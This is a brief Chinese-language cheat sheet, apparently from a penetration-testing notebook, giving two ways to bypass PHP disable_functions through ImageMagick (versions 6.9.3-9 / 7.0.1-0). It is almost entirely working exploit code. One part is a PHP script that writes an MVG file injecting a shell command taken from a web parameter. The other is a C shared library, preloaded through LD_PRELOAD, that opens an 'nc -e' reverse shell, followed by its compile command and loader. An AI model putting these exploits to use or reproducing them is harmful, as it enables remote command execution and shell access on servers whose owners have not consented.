	imageMagick 版本 v6.9.3-9 或 v7.0.1-0
	第一种
```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
$command = 'id';
}
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'    //核心
pop graphic-context
EOF;
file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```
	第二种
```c
#include <stdlib.h>
#include <string.h>
void payload() {
const char* cmd = "nc -e /usr/bin/zsh 127.0.0.1 4444";
system(cmd);
}
int fileno() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```
	编译
	gcc -shared -fPIC imag.c -o imag.so
```php
<?php
putenv('LD_PRELOAD=/var/www/html/imag.so');
$img = new Imagick('/tmp/1.ps');
?>
```